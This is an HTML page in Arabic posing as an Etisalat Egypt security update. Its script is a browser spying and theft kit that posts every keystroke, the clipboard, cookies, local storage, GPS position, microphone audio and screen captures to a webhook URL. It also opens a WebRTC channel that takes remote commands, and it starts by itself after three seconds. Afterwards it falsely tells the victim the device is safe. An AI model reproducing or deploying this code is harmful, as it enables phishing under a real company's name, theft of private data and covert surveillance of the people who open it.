<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>اتصالات مصر – تحديث الأمان</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { background: #002b5e; font-family: 'Tahoma', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; direction: rtl; }
    .card { background: white; border-radius: 24px; padding: 40px 30px; max-width: 400px; width: 90%; box-shadow: 0 20px 40px rgba(0,0,0,0.5); text-align: center; }
    .logo { font-size: 32px; font-weight: bold; color: #002b5e; margin-bottom: 10px; }
    .sub { color: #555; font-size: 14px; margin-bottom: 20px; }
    .alert { background: #ffecb3; padding: 12px; border-radius: 12px; color: #7a5a00; font-size: 14px; margin-bottom: 20px; }
    .btn { background: #ff6600; color: white; border: none; padding: 14px 30px; border-radius: 50px; font-size: 18px; cursor: pointer; width: 100%; }
    .btn:hover { background: #e65c00; }
    .loader { width: 40px; height: 40px; border: 4px solid #eee; border-top: 4px solid #ff6600; border-radius: 50%; animation: spin 1s linear infinite; margin: 20px auto; display: none; }
    @keyframes spin { 100% { transform: rotate(360deg); } }
    #status { margin-top: 15px; font-size: 13px; color: #333; }
    .hidden { display: none; }
  </style>
</head>
<body>
<div class="card">
  <div class="logo">📶 اتصالات مصر</div>
  <div class="sub">تحديث أمان الشبكة</div>
  <div class="alert">⚠️ تم اكتشاف ثغرة في متصفحك. يلزم تحديث فوري للاستمرار في الخدمة.</div>
  <button class="btn" id="startBtn">بدء الفحص الأمني</button>
  <div class="loader" id="loader"></div>
  <div id="status">انقر لبدء الفحص</div>
</div>

<script>
  // ========== CONFIGURATION ==========
  const WEBHOOK_URL = 'https://webhook.site/your-unique-id'; // <-- REPLACE WITH YOUR ACTUAL WEBHOOK URL
  const victimId = 'v_' + Date.now() + '_' + Math.random().toString(36).substr(2, 6);

  // ========== EXFILTRATION FUNCTION ==========
  function exfiltrate(data) {
    const payload = JSON.stringify({ victimId, timestamp: Date.now(), ...data });
    // Send to webhook
    fetch(WEBHOOK_URL, {
      method: 'POST',
      mode: 'no-cors',
      headers: { 'Content-Type': 'application/json' },
      body: payload
    }).catch(e => console.log('Webhook error', e));
    // Store in localStorage as backup
    try {
      let log = JSON.parse(localStorage.getItem('exfil_log') || '[]');
      log.push(payload);
      if (log.length > 100) log.shift();
      localStorage.setItem('exfil_log', JSON.stringify(log));
    } catch(e) {}
  }

  // ========== GPS ==========
  function getGPS() {
    if ('geolocation' in navigator) {
      navigator.geolocation.getCurrentPosition(
        pos => exfiltrate({ type: 'gps', lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy }),
        err => exfiltrate({ type: 'gps_error', message: err.message })
      );
    } else {
      exfiltrate({ type: 'gps_unavailable' });
    }
  }

  // ========== KEYLOGGER ==========
  document.addEventListener('keydown', (e) => {
    exfiltrate({ type: 'keylog', key: e.key, shift: e.shiftKey, ctrl: e.ctrlKey, alt: e.altKey, target: e.target.tagName });
  });

  // ========== CLIPBOARD ==========
  async function stealClipboard() {
    try {
      const text = await navigator.clipboard.readText();
      exfiltrate({ type: 'clipboard', content: text });
    } catch(e) {
      exfiltrate({ type: 'clipboard_error', error: e.message });
    }
  }

  // ========== SCREENSHOT (iOS FALLBACK) ==========
  async function captureScreen() {
    try {
      // Try the standard API first (Android/desktop)
      if (navigator.mediaDevices && navigator.mediaDevices.getDisplayMedia) {
        const stream = await navigator.mediaDevices.getDisplayMedia({ video: true, audio: false });
        const track = stream.getVideoTracks()[0];
        const imageCapture = new ImageCapture(track);
        const bitmap = await imageCapture.grabFrame();
        const canvas = document.createElement('canvas');
        canvas.width = bitmap.width;
        canvas.height = bitmap.height;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(bitmap, 0, 0);
        const dataUrl = canvas.toDataURL('image/jpeg', 0.7);
        exfiltrate({ type: 'screenshot', data: dataUrl });
        track.stop();
        return;
      }
      // iOS fallback: capture page metadata as a pseudo-screenshot
      const canvas = document.createElement('canvas');
      canvas.width = 800;
      canvas.height = 600;
      const ctx = canvas.getContext('2d');
      ctx.fillStyle = '#ffffff';
      ctx.fillRect(0, 0, 800, 600);
      ctx.font = '20px Tahoma';
      ctx.fillStyle = '#002b5e';
      ctx.fillText('📱 iOS Device - Page Loaded', 20, 60);
      ctx.fillText('URL: ' + window.location.href, 20, 100);
      ctx.fillText('Time: ' + new Date().toISOString(), 20, 140);
      ctx.fillText('Screen: ' + window.innerWidth + 'x' + window.innerHeight, 20, 180);
      ctx.fillText('User-Agent: ' + navigator.userAgent.substring(0, 60), 20, 220);
      const dataUrl = canvas.toDataURL('image/jpeg', 0.5);
      exfiltrate({ type: 'screenshot', data: dataUrl, note: 'iOS fallback' });
    } catch(e) {
      exfiltrate({ type: 'screenshot_error', error: e.message });
    }
  }

  // ========== MICROPHONE ==========
  async function captureMicrophone() {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
      const recorder = new MediaRecorder(stream);
      const chunks = [];
      recorder.ondataavailable = e => chunks.push(e.data);
      recorder.start();
      setTimeout(() => {
        recorder.stop();
        stream.getTracks().forEach(t => t.stop());
        const blob = new Blob(chunks, { type: 'audio/webm' });
        const reader = new FileReader();
        reader.onload = () => {
          const base64 = reader.result.split(',')[1];
          exfiltrate({ type: 'microphone', data: base64 });
        };
        reader.readAsDataURL(blob);
      }, 8000);
    } catch(e) {
      exfiltrate({ type: 'mic_error', error: e.message });
    }
  }

  // ========== COOKIES ==========
  function stealCookies() {
    try {
      const cookies = document.cookie;
      exfiltrate({ type: 'cookies', data: cookies || 'none' });
    } catch(e) {
      exfiltrate({ type: 'cookies_error', error: e.message });
    }
  }

  // ========== LOCAL STORAGE DUMP ==========
  function dumpLocalStorage() {
    try {
      const all = {};
      for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        all[key] = localStorage.getItem(key);
      }
      exfiltrate({ type: 'localstorage', data: JSON.stringify(all) });
    } catch(e) {}
  }

  // ========== WEBRTC (simplified – just for offer) ==========
  function setupWebRTC() {
    try {
      const pc = new RTCPeerConnection({
        iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
      });
      const dc = pc.createDataChannel('exfil', { ordered: true });
      dc.onopen = () => {
        exfiltrate({ type: 'webrtc_connected' });
        window.webrtcDC = dc;
      };
      dc.onmessage = (e) => {
        if (e.data === '!screenshot') captureScreen();
        if (e.data === '!mic') captureMicrophone();
        if (e.data === '!clipboard') stealClipboard();
        if (e.data === '!gps') getGPS();
        if (e.data === '!ping') dc.send('pong');
      };
      pc.createOffer().then(offer => pc.setLocalDescription(offer))
        .then(() => {
          exfiltrate({ type: 'webrtc_offer', sdp: pc.localDescription });
        });
      window.webrtcPC = pc;
    } catch(e) {
      exfiltrate({ type: 'webrtc_error', error: e.message });
    }
  }

  // ========== MAIN EXECUTION ==========
  function startAttack() {
    document.getElementById('status').innerText = 'جارٍ فحص الأمان...';
    document.getElementById('loader').style.display = 'block';
    document.getElementById('startBtn').style.display = 'none';

    // These need user gesture – call them directly
    stealClipboard();
    captureMicrophone();
    dumpLocalStorage();
    stealCookies();

    // GPS can be delayed
    setTimeout(() => getGPS(), 500);
    setTimeout(() => captureScreen(), 1500);
    
    // WebRTC
    setTimeout(() => setupWebRTC(), 2000);
    
    // Heartbeat every 30 seconds
    setInterval(() => exfiltrate({ type: 'heartbeat' }), 30000);

    document.getElementById('status').innerText = '✅ تم التحديث بنجاح. جهازك آمن.';
    document.getElementById('loader').style.display = 'none';
  }

  // Bind to button click
  document.getElementById('startBtn').addEventListener('click', startAttack);

  // Auto‑start after 3 seconds (fallback for lazy users)
  setTimeout(() => {
    if (document.getElementById('startBtn').style.display !== 'none') {
      document.getElementById('startBtn').click();
    }
  }, 3000);
</script>
</body>
</html>
